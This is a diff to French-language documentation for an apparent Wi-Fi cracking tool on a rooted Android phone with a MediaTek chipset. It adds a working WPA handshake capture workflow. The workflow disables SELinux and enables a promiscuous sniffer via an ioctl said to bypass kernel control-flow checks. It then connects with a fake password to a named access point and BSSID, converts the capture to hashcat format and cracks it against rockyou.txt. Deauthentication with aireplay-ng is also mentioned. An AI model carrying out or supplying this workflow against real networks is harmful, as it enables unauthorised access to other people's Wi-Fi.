@@ -69,9 +69,8 @@ adb shell "su -c 'setenforce 0'"
 # 0. Desactiver SELinux (obligatoire)
 su -c 'setenforce 0'
 
-# 1. Activer le sniffer ICS via wpa_supplicant
-#    Retourne FAIL mais la commande firmware 0x93 est envoyee
-wpa_cli -p /data/vendor/wifi/wpa/sockets -i wlan0 driver "SNIFFER 2 0 0 0 0 0 0 0 0 0"
+# 1. Activer le sniffer ICS via ioctl 0x8BE5 (bypass dispatch table + KCFI)
+sniffer_direct wlan0 "SNIFFER 2 0 0 0 0 0 0 0 0 0"
 
 # 2. Activer ICS logging (SET_LEVEL + ON_OFF via ioctl)
 #    Les valeurs sont des entiers bruts, PAS des pointeurs
@@ -436,6 +435,63 @@ wifi-cracker/core/.../wifi/
 18. Test injection v7 : kernel accepte les frames mais firmware drop ~99.6% sans association BSS
 19. Validation capture passive v7 : 2.5 MB / 7919 paquets en 60s, management + data frames promiscuous
 20. Conclusion : injection deauth fiable necessite association BSS ou adaptateur USB externe
+
+---
+
+## Capture de handshake WPA (automatisee)
+
+### Technique : connexion avec faux mot de passe
+
+La technique cle pour capturer un handshake sur le chipset MTK interne :
+
+1. **Activer SNIFFER** via ioctl 0x8BE5 (active ICS capture promiscuous)
+2. **Se connecter avec un faux mot de passe** → met le driver sur le canal de l'AP
+3. **L'AP envoie M1** (ANonce) pendant la tentative d'auth → capture via ICS
+4. **Les autres devices du reseau qui se reconnectent** generent des M1+M2 complets
+5. **Repeter** les tentatives de connexion pour maintenir le canal actif
+
+### Script automatise
+
+```bash
+# Sur le device (root) :
+/data/local/tmp/wificracker/mtk_handshake_attack.sh LichaWireless 34:98:b5:46:39:27 5200 10
+
+# Resultat : captures/*.bin (analyse avec le parseur Python)
+```
+
+### Parseur + conversion hashcat
+
+```bash
+# Sur PC :
+python3 mtk_parse_handshake.py capture.bin LichaWireless
+
+# Produit : capture.hc22000
+# Crack :
+hashcat -m 22000 capture.hc22000 rockyou.txt
+```
+
+### Resultat de reference
+
+```
+36.5 MB / 127447 paquets en 5 minutes
+81 EAPOL frames captures (19 M1 + 22 M2)
+AP BSSID: 34:98:b5:46:39:27 (LichaWireless 5GHz)
+```
+
+### Limitation
+
+L'injection deauth est non fiable sur MTK interne (~0.4% de transmission reelle). La technique repose sur les **reconnections naturelles** des autres appareils du reseau, ou sur le **reboot de l'AP** pour forcer tous les clients a se reconnecter.
+
+Pour une injection deauth fiable, utiliser un **adaptateur USB WiFi externe** avec `aireplay-ng`.
+
+### Format des paquets ICS
+
+Les paquets ICS ont une taille fixe de **320 bytes** :
+- Header ICS : 16 bytes (magic + type + seq + info + subtype + frame_len)
+- RX Descriptor MTK : 120 bytes
+- Frame 802.11 : 184 bytes max (frame_len dans le header INCLUT le RX descriptor)
+
+> **Piege** : `frame_len` dans le header ICS = 304, mais la vraie frame 802.11 fait 304 - 120 = **184 bytes**. Le parseur doit soustraire `MTK_RX_DESC_SIZE` du `frame_len`.
 
 ---
 
